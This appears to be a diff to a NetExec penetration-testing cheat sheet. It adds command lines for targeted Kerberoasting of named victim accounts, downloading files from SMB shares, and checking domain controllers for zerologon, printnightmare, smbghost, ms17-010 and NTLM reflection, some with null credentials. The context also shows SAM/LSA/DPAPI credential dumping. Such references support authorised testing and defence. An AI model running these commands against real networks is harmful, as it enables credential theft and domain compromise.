@@ -32,6 +32,7 @@ You can find this cheatsheet on my website as well: [NetExec Cheatsheet](https:/
      - [User Enumeration](#user-enumeration)
      - [All-in-One](#all-in-one)
      - [Kerberoasting & ASREProast](#kerberoasting--asreproast)
+     - [Targeted Kerberoasting](#targeted-kerberoasting)
      - [BloodHound](#bloodhound)
      - [LDAP signing](#ldap-signing)
      - [ADCS Enumeration](#adcs-enumeration)
@@ -154,6 +155,7 @@ netexec smb target -u username -p password -k --get-file target_file output_file
 ```
 netexec smb target -u username -p password -M spider_plus
 netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
+netexec smb target -u username -p password -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 #### **Generate Hosts File**
 ```
@@ -176,6 +178,11 @@ netexec ldap target -u username -p password --trusted-for-delegation --password-
 ```
 netexec ldap target -u username -p password --kerberoasting hash.txt
 netexec ldap target -u username -p password --asreproast hash.txt
+```
+#### **Targeted Kerberoasting**
+```
+netexec ldap target -u username -p password --kerberoasting hash.txt --targeted-kerberoast victim1 victim2
+netexec ldap target -u username -p password --kerberoasting hash.txt --targeted-kerberoast users.list
 ```
 #### **BloodHound**  
 ```
@@ -269,9 +276,12 @@ netexec smb target -u username -p password --sam --lsa --dpapi
 ## **Vulnerabilities**
 Check if the DC is vulnerable to zerologon, petitpotam, nopac
 ```
-netexec smb target -u username -p password -M zerologon
-netexec smb target -u username -p password -M petitpotam
+netexec smb target -u '' -p '' -M zerologon
 netexec smb target -u username -p password -M nopac
+netexec smb target -u '' -p '' -M printnightmare
+netexec smb target -u '' -p '' -M smbghost
+netexec smb target -u '' -p '' -M ms17-010
+netexec smb target -u username -p password -M ntlm_reflection
 ```
 ## Useful Modules
 ### **Webdav**
